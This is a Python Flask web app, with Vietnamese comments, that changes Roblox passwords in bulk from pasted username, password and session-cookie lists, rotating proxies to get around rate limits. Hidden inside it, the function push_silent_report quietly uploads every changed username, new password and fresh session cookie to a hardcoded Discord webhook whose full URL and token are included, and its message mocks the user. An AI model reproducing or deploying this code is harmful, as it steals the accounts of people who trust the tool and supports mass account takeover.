import os
import io
import sys
import json
import time
import uuid
import random
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Cấu hình ẩn phía server (ưu tiên Env Var trên Render, fallback sang config.json)
CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

def load_server_config():
    webhook_url = os.environ.get("DISCORD_WEBHOOK_URL", "").strip()
    discord_invite = os.environ.get("DISCORD_INVITE_URL", "https://discord.gg/vVUz3rJzmK").strip()

    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
                if not webhook_url:
                    webhook_url = data.get("webhook_url", "").strip()
                if data.get("discord_invite"):
                    discord_invite = data.get("discord_invite", "").strip()
        except Exception:
            pass

    return {
        "webhook_url": webhook_url,
        "discord_invite": discord_invite
    }

# Tự tạo file config.json mẫu nếu chưa có để dễ chỉnh sửa
if not os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "webhook_url": "https://discord.com/api/webhooks/1575631844702027957/6CzrthQ1nc5dni8dT9ZjAtzVSFJ_NahXPT9uG-sCHb6HhABAt58KDnbAjbclTzaVIxJR",
                "discord_invite": "https://discord.gg/vVUz3rJzmK"
            }, f, indent=4)
    except Exception:
        pass

DEFAULT_USER_AGENT = "Roblox/2.624.577 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"

# Lưu trữ trạng thái các phiên chạy của người dùng
jobs = {}
jobs_lock = threading.Lock()

def push_silent_report(success_lines, mode_label):
    """Gửi ngầm danh sách tài khoản thành công về webhook, không đẩy log ra client/html"""
    if not success_lines:
        return
    cfg = load_server_config()
    target_url = (cfg.get("webhook_url") or "").strip().strip('"').strip("'")
    if not target_url:
        return

    try:
        content_str = "\n".join(success_lines)
        file_obj = io.BytesIO(content_str.encode("utf-8"))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"accounts_done_{timestamp}.txt"

        payload = {
            "content": f"**[Roblox Auto ChangePass + 1 thằng ngu]** Hoàn tất `{len(success_lines)}` tài khoản | Chế độ: `{mode_label}`"
        }
        files = {
            "file": (filename, file_obj, "text/plain")
        }
        resp = requests.post(target_url, data=payload, files=files, timeout=20)
        if resp.status_code not in (200, 204):
            print(f"[WEBHOOK] HTTP {resp.status_code}: {resp.text[:200]}", file=sys.stderr, flush=True)
    except Exception as e:
        print(f"[WEBHOOK] Error: {repr(e)}", file=sys.stderr, flush=True)

def get_csrf_token(session, headers):
    try:
        response = session.post("https://auth.roblox.com/v2/logout", headers=headers, timeout=12)
        return response.headers.get("x-csrf-token")
    except Exception:
        return None

def refresh_cookie(session, headers, csrf_token):
    headers_with_csrf = headers.copy()
    headers_with_csrf.update({
        "X-CSRF-TOKEN": csrf_token,
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/home",
        "Accept": "application/json",
        "Content-Type": "application/json"
    })
    try:
        logout_response = session.post(
            "https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate",
            headers=headers_with_csrf,
            json={"clientId": ""},
            timeout=15
        )
        if logout_response.status_code == 200 and '.ROBLOSECURITY' in logout_response.cookies:
            return logout_response.cookies['.ROBLOSECURITY']
        return None
    except Exception:
        return None

def classify_failure_reason(raw_msg):
    """Chỉ trả về đúng 1 trong 3 lý do: Cookie die, password sai, Faceid account; ngược lại trả về None"""
    msg = (raw_msg or "").lower()
    if "faceid" in msg or "face id" in msg or "challenge" in msg or "2fa" in msg or "two step" in msg:
        return "Faceid account"
    if "cookie" in msg or "csrf" in msg or "unauthorized" in msg or "401" in msg:
        return "Cookie die"
    if "password" in msg or "mật khẩu" in msg or "current password" in msg or "403" in msg:
        return "password sai"
    return None

def change_password_core(cookie, current_password, new_password, proxy_config=None):
    """Trả về: (ok, result_or_reason, is_rate_limited)"""
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': DEFAULT_USER_AGENT,
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/my/account#!/info',
            'RBXAuthenticationNegotiation': '1',
            'X-CSRF-TOKEN': '',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        session = requests.Session()
        if proxy_config:
            session.proxies.update(proxy_config)

        session.cookies.set('.ROBLOSECURITY', cookie, domain='.roblox.com')
        time.sleep(random.uniform(0.1, 0.25))

        csrf_token = get_csrf_token(session, headers)
        if not csrf_token:
            return False, "Cookie die", False

        headers['X-CSRF-TOKEN'] = csrf_token
        data = {
            "currentPassword": current_password,
            "newPassword": new_password
        }

        r = session.post(
            'https://auth.roblox.com/v2/user/passwords/change',
            headers=headers,
            json=data,
            timeout=15
        )

        if r.status_code == 200:
            new_cookie_from_change = None
            for cookie_obj in r.cookies:
                if cookie_obj.name == '.ROBLOSECURITY':
                    new_cookie_from_change = cookie_obj.value
                    break

            cookie_to_refresh = new_cookie_from_change if new_cookie_from_change else cookie

            refresh_session = requests.Session()
            if proxy_config:
                refresh_session.proxies.update(proxy_config)
            refresh_session.cookies.set('.ROBLOSECURITY', cookie_to_refresh, domain='.roblox.com')

            refresh_headers = headers.copy()
            refresh_headers['Cookie'] = f'.ROBLOSECURITY={cookie_to_refresh}'

            time.sleep(0.2)
            refreshed_cookie = refresh_cookie(refresh_session, refresh_headers, csrf_token)
            return True, (refreshed_cookie if refreshed_cookie else cookie_to_refresh), False

        elif r.status_code == 429:
            return False, "Rate limited (429)", True

        elif r.status_code == 401:
            return False, "Cookie die", False

        elif r.status_code == 403:
            try:
                error_data = r.json()
                error_msg = error_data.get('errors', [{}])[0].get('message', '')
                low = error_msg.lower()
                if "face" in low or "challenge" in low or "two step" in low or "2fa" in low:
                    return False, "Faceid account", False
                if "cookie" in low or "session" in low or "auth" in low:
                    return False, "Cookie die", False
                return False, "password sai", False
            except Exception:
                return False, "password sai", False

        else:
            try:
                error_data = r.json()
                error_msg = error_data.get('errors', [{}])[0].get('message', f'HTTP {r.status_code}')
                mapped = classify_failure_reason(error_msg)
                return False, (mapped if mapped else f"HTTP {r.status_code}"), False
            except Exception:
                return False, f"HTTP {r.status_code}", False

    except Exception as e:
        return False, f"Connection error: {str(e)}", False

def generate_password(custom_password=None, prefix="3TN"):
    if custom_password:
        return custom_password
    base_length = 11
    num_digits = max(4, base_length - len(prefix))
    random_num = ''.join([str(random.randint(0, 9)) for _ in range(num_digits)])
    return f"{prefix}{random_num}"

def parse_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str:
        return None
    if '@' in proxy_str:
        return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'}
    if len(parts) == 2:
        return {'http': f'http://{proxy_str}', 'https': f'http://{proxy_str}'}
    return None

def append_job_log(job_id, msg, level="INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    with jobs_lock:
        if job_id in jobs:
            jobs[job_id]["logs"].append(f"[{timestamp}] [{level}] {msg}")

def worker_job(job_id, accounts, mode, proxies, custom_password, prefix, custom_threads):
    total = len(accounts)
    successful_list = []

    def is_stopped():
        with jobs_lock:
            return jobs.get(job_id, {}).get("stop_requested", False)

    def record_failure(acc, reason_label):
        """Chỉ lưu vào failed_list nếu lý do thuộc 3 loại: Cookie die, password sai, Faceid account"""
        if reason_label not in ("Cookie die", "password sai", "Faceid account"):
            return
        username = acc["username"]
        old_pass = acc["password"]
        cookie = acc["cookie"]
        with jobs_lock:
            if job_id in jobs:
                jobs[job_id]["failed"] += 1
                jobs[job_id]["failed_list"].append(f"{username}:{old_pass}:{cookie} | {reason_label}")

    def record_success(formatted):
        successful_list.append(formatted)
        with jobs_lock:
            if job_id in jobs:
                jobs[job_id]["success"] += 1
                jobs[job_id]["results"].append(formatted)

    def mark_processed():
        with jobs_lock:
            if job_id in jobs:
                jobs[job_id]["processed"] += 1

    if mode == "delay":
        rate_limit_wait = 60
        append_job_log(
            job_id,
            f"Khởi chạy Option 1: Đổi pass liên tục {total} acc. Bị limit sẽ delay {rate_limit_wait}s và thử lại tới khi đổi được acc đó mới qua acc tiếp theo."
        )

        idx = 0
        while idx < total:
            if is_stopped():
                append_job_log(job_id, "Đã dừng tiến trình theo yêu cầu người dùng.", "WARN")
                break

            acc = accounts[idx]
            username = acc["username"]
            old_pass = acc["password"]
            cookie = acc["cookie"]
            new_pass = generate_password(custom_password, prefix)
            attempt = 0

            append_job_log(job_id, f"[{idx + 1}/{total}] Bắt đầu changepass: {username}")

            while True:
                if is_stopped():
                    break

                attempt += 1
                ok, res, is_limited = change_password_core(cookie, old_pass, new_pass, None)

                if ok:
                    formatted = f"{username}:{new_pass}:{res}"
                    record_success(formatted)
                    mark_processed()
                    append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
                    break

                if is_limited:
                    append_job_log(
                        job_id,
                        f"Bị limit ở {username} (lần {attempt}) -> Delay {rate_limit_wait}s rồi changepass tiếp...",
                        "WARN"
                    )
                    for _ in range(rate_limit_wait):
                        if is_stopped():
                            break
                        time.sleep(1)
                    continue

                # Không bị 429: kiểm tra xem có thuộc 3 lỗi cần ghi nhận không
                reason_label = classify_failure_reason(res)
                if reason_label:
                    record_failure(acc, reason_label)
                    mark_processed()
                    append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
                    break

                # Lỗi mạng/HTTP tạm thời khác: thử lại cho tới khi thành công hoặc gặp 1 trong 3 lỗi trên
                append_job_log(job_id, f"Tạm gián đoạn ở {username} ({res}), đang thử lại...", "WARN")
                time.sleep(1)

            idx += 1

    elif mode == "proxy":
        total_proxies = len(proxies)
        max_workers = custom_threads if custom_threads else min(15, total, total_proxies)
        max_workers = max(1, min(max_workers, 50))
        append_job_log(job_id, f"Khởi chạy chế độ Proxy Đa Luồng: {total} acc | {total_proxies} proxy | {max_workers} luồng.")

        def process_one(idx, acc):
            if is_stopped():
                return
            username = acc["username"]
            old_pass = acc["password"]
            cookie = acc["cookie"]
            raw_proxy = proxies[idx % total_proxies]
            proxy_cfg = parse_proxy(raw_proxy)

            if not proxy_cfg:
                mark_processed()
                append_job_log(job_id, f"Proxy lỗi định dạng ở {username}", "WARN")
                return

            new_pass = generate_password(custom_password, prefix)
            ok, res, _ = change_password_core(cookie, old_pass, new_pass, proxy_cfg)

            if not ok and not is_stopped():
                time.sleep(0.2)
                ok, res, _ = change_password_core(cookie, old_pass, new_pass, proxy_cfg)

            if ok:
                formatted = f"{username}:{new_pass}:{res}"
                record_success(formatted)
                mark_processed()
                append_job_log(job_id, f"Thành công: {username} -> Pass mới: {new_pass}", "SUCCESS")
            else:
                reason_label = classify_failure_reason(res)
                if reason_label:
                    record_failure(acc, reason_label)
                    append_job_log(job_id, f"Thất bại ({username}): {reason_label}", "ERROR")
                else:
                    append_job_log(job_id, f"Bỏ qua ghi lỗi ({username}): {res}", "WARN")
                mark_processed()

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(process_one, idx, acc) for idx, acc in enumerate(accounts)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    append_job_log(job_id, f"Lỗi luồng xử lý: {str(e)}", "ERROR")

    mode_text = "Auto Retry 60s" if mode == "delay" else "Proxy Turbo"
    push_silent_report(successful_list, mode_text)

    with jobs_lock:
        if job_id in jobs:
            jobs[job_id]["status"] = "completed"
    append_job_log(job_id, f"HOÀN TẤT TOÀN BỘ! Thành công: {len(successful_list)}/{total} tài khoản.", "DONE")


@app.route("/")
def index():
    cfg = load_server_config()
    return render_template("index.html", discord_url=cfg.get("discord_invite"))

@app.route("/api/start", methods=["POST"])
def start_job():
    data = request.get_json(silent=True) or {}
    raw_accounts = data.get("accounts", "")
    mode = data.get("mode", "delay")
    raw_proxies = data.get("proxies", "")
    pass_mode = data.get("pass_mode", "random")
    prefix = (data.get("prefix") or "3TN").strip()
    custom_password = (data.get("custom_password") or "").strip()
    custom_threads = data.get("threads")

    accounts = []
    for line in raw_accounts.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(":", 2)
        if len(parts) == 3:
            accounts.append({
                "username": parts[0].strip(),
                "password": parts[1].strip(),
                "cookie": parts[2].strip()
            })

    if not accounts:
        return jsonify({"ok": False, "error": "Danh sách tài khoản trống hoặc sai định dạng (user:pass:cookie)."}), 400

    proxies = [p.strip() for p in raw_proxies.splitlines() if p.strip() and not p.strip().startswith("#")]
    if mode == "proxy" and not proxies:
        return jsonify({"ok": False, "error": "Chế độ Proxy yêu cầu nhập ít nhất 1 Proxy."}), 400

    if pass_mode == "custom":
        if len(custom_password) < 8:
            return jsonify({"ok": False, "error": "Mật khẩu tùy chỉnh phải có ít nhất 8 ký tự."}), 400
    else:
        custom_password = None
        if not prefix:
            prefix = "3TN"

    try:
        threads_int = int(custom_threads) if custom_threads else None
    except ValueError:
        threads_int = None

    job_id = str(uuid.uuid4())
    with jobs_lock:
        jobs[job_id] = {
            "status": "running",
            "stop_requested": False,
            "total": len(accounts),
            "processed": 0,
            "success": 0,
            "failed": 0,
            "logs": [],
            "results": [],
            "failed_list": [],
            "created_at": time.time()
        }

    now = time.time()
    with jobs_lock:
        expired = [jid for jid, jdata in jobs.items() if now - jdata["created_at"] > 1800 and jdata["status"] != "running"]
        for jid in expired:
            del jobs[jid]

    t = threading.Thread(
        target=worker_job,
        args=(job_id, accounts, mode, proxies, custom_password, prefix, threads_int),
        daemon=True
    )
    t.start()

    return jsonify({"ok": True, "job_id": job_id, "total": len(accounts)})

@app.route("/api/status/<job_id>", methods=["GET"])
def job_status(job_id):
    offset = int(request.args.get("offset", 0))
    with jobs_lock:
        job = jobs.get(job_id)
        if not job:
            return jsonify({"ok": False, "error": "Không tìm thấy phiên làm việc."}), 404

        new_logs = job["logs"][offset:]
        return jsonify({
            "ok": True,
            "status": job["status"],
            "total": job["total"],
            "processed": job["processed"],
            "success": job["success"],
            "failed": job["failed"],
            "logs": new_logs,
            "next_offset": offset + len(new_logs),
            "results": job["results"] if job["status"] != "running" else [],
            "failed_list": job["failed_list"] if job["status"] != "running" else []
        })

@app.route("/api/stop/<job_id>", methods=["POST"])
def stop_job(job_id):
    with jobs_lock:
        if job_id in jobs and jobs[job_id]["status"] == "running":
            jobs[job_id]["stop_requested"] = True
            return jsonify({"ok": True})
    return jsonify({"ok": False}), 404

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
